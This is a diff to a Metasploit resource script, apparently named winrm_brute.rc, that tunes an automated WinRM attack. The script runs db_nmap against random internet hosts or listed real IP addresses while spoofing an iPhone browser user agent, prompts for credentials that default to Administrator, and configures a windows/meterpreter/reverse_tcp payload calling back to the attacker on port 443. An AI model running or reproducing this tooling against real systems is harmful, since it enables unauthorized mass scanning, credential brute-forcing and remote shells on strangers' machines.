@@ -6,7 +6,7 @@
           setg SAVE_DB true - Save workspace redteam to database.xml
           setg LIMMIT 1000 - Limmit the number of random WAN hosts to search
           setg RANDOM_HOSTS true - To instruct db_nmap to random search in WAN for hosts with ports open
-          setg RHOSTS 154.208.147.160 71.190.221.109 - To instruct db_nmap to scan hosts for ports open.
+          setg RHOSTS 154.208.147.160 201.187.140.218 - To instruct db_nmap to scan hosts for ports open.
           setg USERPASS_FILE /root/my_dicionary.txt - To instruct auxiliarys to use our own dicionary file
           winrm_brute.rc will use nmap to populate the msfdb database with remote hosts address then it
           triggers msf auxiliary/scanners based on host(s) open port(s) and service name discovery.
@@ -69,10 +69,10 @@
       ## db_nmap WAN or RHOSTS or LOCAL_LAN scan settings
       # HINT: nmap will use a fake user-agent string (iPhone:Safari) while scanning.
       unless (framework.datastore['RANDOM_HOSTS'] == "true")
-         run_single("db_nmap -sV -Pn -T4 -O -p 80,5985 --open --script=http-headers.nse,smb-os-discovery.nse --script-args http.useragent=\"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1\" #{framework.datastore['RHOSTS']}")
+         run_single("db_nmap -sV -Pn -T4 -O -p 80,5985 --open --script=http-headers.nse,http-winrm.nse --script-args http.useragent=\"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1\" #{framework.datastore['RHOSTS']}")
       else
          print_good("Nmap: search for random remote hosts with ports 80:5985 open")
-         run_single("db_nmap -sV -Pn -T5 -O -iR #{framework.datastore['LIMMIT']} -p 80,5985 --open --script=http-headers.nse,smb-os-discovery.nse --script-args http.useragent=\"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1\"")
+         run_single("db_nmap -sV -Pn -T5 -O -iR #{framework.datastore['LIMMIT']} -p 80,5985 --open --script=http-headers.nse,http-winrm.nse --script-args http.useragent=\"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1\"")
       end
 
       ## Read the database 
@@ -153,12 +153,12 @@
               Rex::sleep(1.5)
 
                  ## User Inputs (username|password)
-                 print "[+] Remote winrm USERNAME: "
+                 print "[+] Input Remote winrm USERNAME: "
                  user_name = gets.chomp
                  if user_name.nil? or user_name == '' or user_name == ' '
                     user_name = "Administrator"
                  end
-                 print "[+] Remote winrm PASSWORD: "
+                 print "[+] Input Remote winrm PASSWORD: "
                  user_pass = gets.chomp
                  if user_pass.nil? or user_pass == '' or user_pass == ' '
                     user_pass = "Administrator"
@@ -170,7 +170,7 @@
               run_single("set VERBOSE true")
               run_single("set THREADS 10")
               run_single("set LHOST #{com}")
-              run_single("set LPORT 445")
+              run_single("set LPORT 443")
               run_single("set PAYLOAD windows/meterpreter/reverse_tcp")
               print_line("")
               run_single("services -c name -S winrm -R")
